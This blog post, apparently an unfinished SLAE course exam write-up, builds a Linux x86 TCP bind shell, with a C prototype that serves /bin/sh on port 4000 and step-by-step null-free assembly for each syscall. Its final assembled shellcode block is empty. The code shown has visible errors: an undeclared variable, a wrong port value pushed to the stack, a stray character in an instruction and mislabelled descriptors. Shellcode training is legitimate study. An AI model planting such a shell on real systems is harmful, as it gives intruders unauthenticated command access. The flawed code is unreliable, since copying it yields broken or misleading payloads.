---
title: SLAE exam assignment 01
author: Stipe Marinovic
date: 2020-05-17 20:00:00 +0800
categories: [Blogging, Tutorial]
tags: [slae, shellcoding]
toc: true
---
... page still under construction ...  

## Assignment 01 ##

* Create a Shell_Bind_TCP shellcode
  - Binds to a port
  - Execs Shell on incoming connection
* Port number should be easily configurable

## Prototype ##

To get idea how bind shell works and which syscalls are used/needed, we can create prototye of bind shell code in C.  

```
#define _GNU_SOURCE # added to avoid gcc's implicit declaration of function warning
#include <unistd.h> 
#include <stdio.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 

int main() { 

  // Define struct containing bind() arguments
  struct sockaddr_in server; 

  // Define socket file descriptor
  int socketfd; 
  int socketid; 
   
  // Create socket 
  socketd = socket(AF_INET, SOCK_STREAM, 6); 

  // Setup struct "server" containing following information: address, port and address family
  server.sin_addr.s_addr = htonl(INADDR_ANY); // any address (0.0.0.0)
  server.sin_port = htons(4000);              // port 4000
  server.sin_family = AF_INET;                // address family (ip v4)

  // Bind socket to ip 0.0.0.0, port 4000 
  bind(socketd, (struct sockaddr*) &server, sizeof(server)); 

  // Listen for incoming connections 
  listen(socketd, 2); 

  // Accept incoming connection 
  socketid = accept(socketd, NULL, NULL); 

  // Bind STDIN (0), STDOUT (1), STDERR (2) to incoming connection 
  dup2(socketid, 0); 
  dup2(socketid, 1); 
  dup2(socketid, 2); 

  // Run /bin/sh shell 
  execve("/bin/sh", NULL, NULL); 
} 
```

Once application is compiled (`with: gcc bind.c`) and run (`./a.out`), we can confirm with netstat (`netstat -antvp`) and netcat (`nc -v 127.0.0.1 4000`) 
that application is indeed listening at port 4000 and provides shell to whoever connects to listening port as shown on following screenshot.
![bind shell](https://smarinovic.github.io/assets/img/slae_00001.png)

## Syscalls ##

Based on prototype code above, we can conclude that following syscalls are needed to implement bind shell:

* socket
* bind
* listen
* accept
* dup2
* execve

List of all syscalls and their associated numbers can be found in: unistd_32.h. On Kali 2019.4 linux file is located on following location: 
```
/usr/include/x86_64-linux-gnu/asm/unistd_32.h
```
```
Syscall               Dec   Hex
----------------------------------
#define __NR_socket   359   0x167
#define __NR_bind     361   0x169
#define __NR_listen   363   0x16B
#define __NR_accept4  364   0x16C
#define __NR_dup2     63    0x3F
#define __NR_execve   11    0xB
```

Each syscall and its arguments are defined in man 2 pages in form of C function. In order to find out which argments are needed we need to look at man pages. 
Based on man 2 pages for socket syscall (`man 2 socket`) we can see the three arguments that need to be passed to syscall.

```
int socket(int domain, int type, int protocol);
```
socket()  creates an endpoint for communication and returns a file descriptor that refers to that endpoint.  
The domain argument specifies a communication domain; this selects the protocol family which will be used for communication.  These families are defined in <sys/socket.h>.  
The socket has the indicated type, which specifies the communication semantics.  
The protocol specifies a particular protocol to be used with the socket.  Normally only a single protocol exists to support a particular socket type within a given protocol family, in which case protocol can be specified as 0.
  
Arguments are passed via registers in following order; EAX, EBX, ECX, EDX, ESI, EDI. EAX always contains syscall number (in case of socket it is decimal 359 or hex 0x167). 
The domain, type and protocol needs to be passed in EBX, ECX and EDX registers.
  
Assemlby instraction: `MOV EAX, value` is used to move value to EAX register. Since shell code will most probably be used within exploit, payload cannot contain null byte as null byte (\x00) terminates string and break exploit. Playing with msf-nasm_shell.rb script which is available in Kali linux we can see that opcode for MOV EAX, 0x167 contains null bytes.
```
nasm > mov eax, 0x167
00000000  B867010000        mov eax, 0x167
Null Bytes -----^^^^
```
To mitigate this issue, we need to find another way of placing 0x167 in EAX register. One way is to do this is to clear EAX register (set it to zero) and once EAX register is set to zero use MOV AX, 0x167 which refers to first 16 bit of EAX register. Opcode for such instruction does not contain null bytes as shown on following example:
```
nasm > mov ax, 0x167
00000000  66B86701          mov ax, 0x167
nasm > 
```

Once syscall number is placed in EAX register, we can continue with function arguments. If we look at prototype code: 
```
socket(AF_INET, SOCK_STREAM, 6);
``` 

Domain (AF_INET) is defined in: `/usr/include/x86_64-linux-gnu/bits/socket.h` as value "2" (PF_INET is the same as AF_INET):

```
/* Protocol families.  */
#define PF_INET         2       /* IP protocol family.  */
```
Type (SOCK_STREAM) is defined in `/usr/include/x86_64-linux-gnu/bits/socket_type.h` as value "1"
```
/* Types of sockets.  */
enum __socket_type
{
  SOCK_STREAM = 1,              /* Sequenced, reliable, connection-based
                                   of fixed maximum length.  */
```

Since moving values 1, 2 and 6 to EBX, ECX and EDX would generate null bytes as shown on following block code: 
```
nasm > mov EBX, 0x2
00000000  BB02000000        mov ebx,0x2 
Null bytes ---^^^^^^
                                   
nasm > mov ECX, 0x1
00000000  B901000000        mov ecx,0x1
Null bytes ---^^^^^^

nasm > mov EDX, 0x6
00000000  BA06000000        mov edx,0x6 
Null bytes ---^^^^^^
```

similar to moving value to EAX register, we can move values to BL, CL and DL wich represents first 8 bites of EBX, ECX and EDX registers. We couldn't use MOV AL, 0x167 as 0x167 requires more than 8 bits so AX had to be used.

```
nasm > mov bl, 0x2
00000000  B302              mov bl,0x2
nasm > mov cl, 0x1
00000000  B101              mov cl,0x1
nasm > mov dl, 0x6
00000000  B206              mov dl,0x6
```

Before we can move any value to register we need to se registers to zero. The easiest way to do it without null bytes is to preform XOR operation on register.

```
; Clearing registers
XOR EAX, EAX    ; set EAX to zero
XOR EBX, EBX    ; set EBX to zero
XOR ECX, ECX    ; set ECX to zero
XOR EDX, EDX    ; set EDX to zero
```

When registers are set to zero we can start writing assembly code to call socket syscall:

```
MOV AX, 0x167  ; 0x167 is hex syscall to socket
MOV BL, 2      ; set domain argument
MOV CL, 1      ; set type argument
MOV DL, 6      ; set protocol argument
INT 0x80       ; interrupt

MOV EDI, EAX   ; as result of socket syscall descriptor is saved in EAX
               ; descriptor will be used with several other syscalls so
               ; we need to save it some how for later use. One way is
               ; to save it in EDI register which is least likely to be 
               ; used in following syscalls
```

Next step is to prepare registers for bind syscall. According to `man 2 bind`, bind takes 4 arguments.

```
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```
When a socket is created with socket(2), it exists in a name space (address family) but has no address assigned to it.
bind() assigns the address specified by addr to the socket referred to by the file descriptor sockfd.  
addrlen specifies the size, in bytes, of the address structure pointed to by addr.

In a same way as for socket syscall we need to prepare data for bind bind syscall with exception that bind is using struct sockaddr which needs to be saved on the stack. 
In order to place some value on the stack PUSH instraction needs to be used. 
Since stack grows from higher addresses to lower addresses, last argument needs to be pushed first and due to little endian format values needs to be pushed in reverse order. 

```
server.sin_addr.s_addr = htonl(INADDR_ANY); // any address (0.0.0.0)
server.sin_port = htons(4000);              // port 4000
server.sin_family = AF_INET;                // address family (ip v4)
```
There is also 4th parameter: sin_zero wish is always zero. So in order to push these values onto the stack we have to use push in following order:

```
XOR  ECX, ECX    ; clear ECX so that we can push zero to the stack
PUSH ECX         ; push zero_sin = 0 to the stack
PUSH ECX         ; push INADDR_ANY = 0.0.0.0 to the stack
PUSH word 0x0AF  ; push hex 0xFA0 (dec 4000) in reverse oreder due to little endian
PUSH word 0x02   ; push hex 0x02 (dec 2) on the stack. 2 represents AF_INET
```

When struct is placed on the stack, ESP is pointing to the top of the stack, so we need to place address from ESP to ECX as address needs to be passed as 2nd argument to bind syscall.
Once we have struct placed on the stack we can write assembly code for bind syscall.

```
MOV EBX, EAX     ; copy value from EAX to EBX, EAX holds pointer to socket descriptor as result of socket call
MOV EAX, 0x169   ; move bind syscall number in EAX register
MOV ECX, ESP     ; move address pointing to the top of the stack to ECX
MOV DL, 0x16     ; move value 0x16 to EDX as third parameter
INT 0x80         ; interrupt
```

In the same way listen syscall can be written in assembly.
```
int listen(int sockfd, int backlog);
```
listen() marks the socket referred to by sockfd as a passive socket, that is, as a socket that will be used to accept incoming connection requests using accept(2).
The sockfd argument is a file descriptor that refers to a socket of type SOCK_STREAM or SOCK_SEQPACKET.
The backlog argument defines the maximum length to which the queue of pending connections for sockfd may grow.  

From prototype code we can see backlog is set to 2: `listen(socketd, 2)` and sockfd is result of socket syscall currently located in EDI register.

```
XOR EAX, EAX     ; set EAX to zero
MOV EAX, 0x16B   ; move 0x16B to EAX
MOV EBX, EDI     ; move socket descriptor into EBX as first argument
MOV CL,  0x2     ; move "2" as backlog into ECX as second argument
INT 0x80         ; interrupt
```

Now when we have socket, bind and listen, next we need to accept connection. From `man 2 accept` we can see which arguments need to be passed to syscall.
```
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
```

The accept() system call is used with connection-based socket types (SOCK_STREAM, SOCK_SEQPACKET). 
It extracts the first connection request on the queue of pending connections for the listening socket, sockfd, creates a new connected socket, and returns a new file descriptor referring to that socket.  
The newly created socket is not in the listening state.  

```
XOR EAX, EAX     ; set EAX to zero for clean start
MOV EAX, 0x16C   ; move accept syscall number (0x16C) in EAX
MOV EBX, EDI     ; move socket descriptor from EDI to EBX as first argument
XOR ECX, ECX     ; set ECX to zero as argument is NULL
XOR EDX, EDX     ; set EDX to zero as argument is NULL
XOR ESI, ESI     ; set flag to 0 by XOR-ing
INT 0x80         ; interrupt

XOR EDI, EDI     ; set EDI to zero
MOV EDI, EAX     ; As result, new socket descriptor will be saved in EAX 
                 ; so we can move it to EDI for further use.
```

Almost there.. next we need to call dup2 syscall with following arguments:
```
int dup2(int oldfd, int newfd);
```
The dup2() system call performs the same task as dup(), but instead of using the lowest-numbered unused file descriptor, it uses the file descriptor number specified in newfd.  If the file descriptor newfd was previously open, it is silently closed before being reused.

Looking at prototype we can see that dup2() needs to be called three time, for STDIN (0), STOUT (2) and STDERR (3).

```
dup2(socketid, 0);
dup2(socketid, 1);
dup2(socketid, 2);
```

To reduce shell code size, instad of manually goind thru each dup2 syscall, we can create a loop. 
ECX register will be used as counter but also as 2nd argument to dup2 syscall.

```
MOV CL, 0x3     ; putting 3 in the counter
LOOP_DUP2:      ; loop label
XOR EAX, EAX    ; clear EAX
MOV AL, 0x3F    ; putting the syscall code in EAX
MOV EBX, EDI    ; putting our new socket descriptor in EBX
DEC CL          ; decrementing CL by one (so at first CL will be 2 then 1 and then 0)
INT 0x80        ; interrupt
JNZ LOOP_DUP2   ; "jump non zero" jumping back to the top of LOOP_DUP2 if the zero flag is not set
```

And finaly execve syscall.

```
int execve(const char *pathname, char *const argv[], char *const envp[]);
```
execve()  executes the program referred to by pathname.  
This causes the program that is currently being run by the calling process to be replaced with a new program, 
with newly initialized stack, heap, and (initialized and uninitialized) data segments.
pathname must be either a binary executable, or a script starting with a line of the form: `#!interpreter [optional-arg]`.
  
argv is an array of argument strings passed to the new program.  By convention, the first of these strings (i.e., argv[0]) should  contain  the  filename associated  with  the file being executed.  envp is an array of strings, conventionally of the form key=value, which are passed as environment to the new program. 
The argv and envp arrays must each include a null pointer at the end of the array.

First we need to push values to the stack. Argv and envp need to have null pointer as well as path name must be null terminated. Since stack grovs from higher to lower memory address, first we need to push null byte and then "/bin/sh" in reverse order. Additinal remark, since "/bin/sh" takes 7 bytes, we can add another slash to have 8 bytes "//bin/sh" and avoid null bytes. 
In order to push null byte to stack, we need to zero-out EAX and push it to stack:

```
XOR EAX, EAX
PUSH EAX
```

After that, we need to push "//bin/sh"
```
PUSH 0x68732f6E
PUSH 0x69622f2F
```

Then we need to place pointer to beggining of stack to EBX. ESP is pointing to the beggining of the stack and put null pointer by pushing EAX to the stack.
```
MOV EBX, ESP
PUSH EAX
MOV EDX, ESP
```

ECX should point to the location of EBX so we can push EBX to the stack and move ESP which points to the top of the stack to EXC and finaly load execve syscall number to EAX (AL).
```
PUSH EBX
MOV ECX, ESP
MOV AL, 0x0Bž
INT 0x80
```

## Bind shell code ##

So when we put it all together and add sections and entry point the result is following:

```




```

